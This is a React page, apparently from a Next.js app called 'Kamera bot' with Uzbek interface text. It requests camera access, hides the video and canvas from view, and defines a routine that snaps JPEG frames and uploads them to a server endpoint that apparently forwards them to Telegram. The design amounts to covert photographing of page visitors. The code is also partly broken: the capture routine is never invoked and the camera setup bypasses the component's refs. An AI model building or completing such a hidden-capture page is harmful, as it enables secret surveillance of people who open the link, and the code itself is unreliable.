import { useEffect, useRef, useState } from "react";

export default function Home() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState("Kamera ishga tushmoqda...");

  useEffect(() => {
  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.querySelector("video");
      video.srcObject = stream;
    } catch (err) {
      console.error("Kamera ishga tushmadi:", err);
      alert("Kamera ruxsati berilmagan yoki xato yuz berdi.");
    }
  }

    async function captureFrame() {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      if (!video || !video.videoWidth) return;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      const blob = await new Promise((resolve) =>
        canvas.toBlob(resolve, "image/jpeg", 0.8)
      );
      await sendToServer(blob);
    }

    async function sendToServer(blob) {
      const form = new FormData();
      form.append("photo", blob, "photo.jpg");
      const res = await fetch("/api/send-photo", {
        method: "POST",
        body: form,
      });
      const json = await res.json();
      if (json.ok) {
        setStatus("✅ Yuborildi: " + new Date().toLocaleTimeString());
      } else {
        setStatus("❌ Xato: " + (json.error || "Telegram xatosi"));
      }
    }

    startCamera();
  }, []);

  return (
    <div
      style={{
        height: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        background: "#000",
        color: "#fff",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <h1>Kamera bot</h1>
      <p>{status}</p>
      <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />
      <canvas ref={canvasRef} style={{ display: "none" }} />
    </div>
  );
}
